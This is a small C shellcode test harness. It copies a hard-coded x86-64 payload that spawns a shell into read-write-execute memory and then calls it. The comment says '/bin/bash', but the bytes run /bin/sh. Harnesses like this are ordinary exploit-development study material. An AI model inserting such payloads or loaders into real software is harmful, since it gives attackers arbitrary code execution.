#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>

//bin/bash shellcode
char code[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

int main(){
	//Get size of pages
	long pagesize = getpagesize();
	
	printf("Addresse shellcode : %p\n",code);
	printf("Pagesize :%d\n", pagesize);
	printf("Length shellcode :%d bytes\n", strlen(code));
	//Allocate sizeof(code) memory and give read, write and execute rigths to that memory
	char *addr = mmap(0, sizeof(code), PROT_READ | PROT_EXEC | PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
	//Checking if allocate failed
	if (addr == MAP_FAILED){
		printf("Mapping failed");
	}
	//If no, copy the shellcode into the memory
	memcpy(addr, code, sizeof(code));
	//Print the starting address of the shellcode in memory
	printf("Mémoire allouée à : %p", addr);
	//Dereference the pointer (which means get its value), cast the addr of the shellcode into a function and call it
	(* ((void(*)()) addr)) ();	
	return 0;
}

